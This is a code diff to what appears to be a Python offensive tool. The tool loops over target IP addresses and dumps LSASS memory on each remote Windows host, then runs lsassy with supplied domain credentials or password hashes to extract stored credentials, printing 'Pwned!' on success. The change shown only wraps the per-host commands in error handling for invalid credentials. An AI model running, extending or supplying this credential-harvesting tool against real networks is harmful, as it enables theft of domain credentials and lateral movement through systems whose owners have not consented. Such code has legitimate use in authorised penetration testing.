@@ -184,7 +184,7 @@ if __name__ == "__main__":
                     print("Nothing to show on lsassy...")
             except subprocess.CalledProcessError as e:
                 if "invalid" in e.output.decode("utf-8"):
-                    print("Invalid credentials on {}!".format(args.targ))
+                    print("Error. Invalid credentials on {}!".format(args.targ))
         else:
             f = open(args.targ, 'r').read().split('\n')
             for ip in f:
@@ -198,16 +198,20 @@ if __name__ == "__main__":
                         command2 = 'lsassy --hashes {} {}/{}@{}:/C$/Windows/Temp/dump.bin'.format(args.pasw, args.domn, args.user, ip)
                     else:
                         command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, ip)
-                    command_output = subprocess.check_output(command1, shell=True)
-                    command_output = command_output.decode("utf-8")
-                    if "Completed" in command_output:
-                        print("Dump executed on {}".format(ip))
-                    else:
-                        print("Error dumping on {}, try again.".format(ip))
-                    command_output = subprocess.check_output(command2, shell=True)
-                    command_output = command_output.decode("utf-8")
-                    if "[+]" in command_output:
-                        print("Pwned!")
-                        print(command_output)
-                    else:
-                        print("Nothing to show on lsassy...")
+                    try:    
+                        command_output = subprocess.check_output(command1, shell=True)
+                        command_output = command_output.decode("utf-8")
+                        if "Completed" in command_output:
+                            print("Dump executed on {}".format(ip))
+                        else:
+                            print("Error dumping on {}, try again.".format(ip))
+                        command_output = subprocess.check_output(command2, shell=True)
+                        command_output = command_output.decode("utf-8")
+                        if "[+]" in command_output:
+                            print("Pwned!")
+                            print(command_output)
+                        else:
+                            print("Nothing to show on lsassy...")
+                    except subprocess.CalledProcessError as e:
+                        if "invalid" in e.output.decode("utf-8"):
+                            print("Error. Invalid credentials on {}!".format(ip))
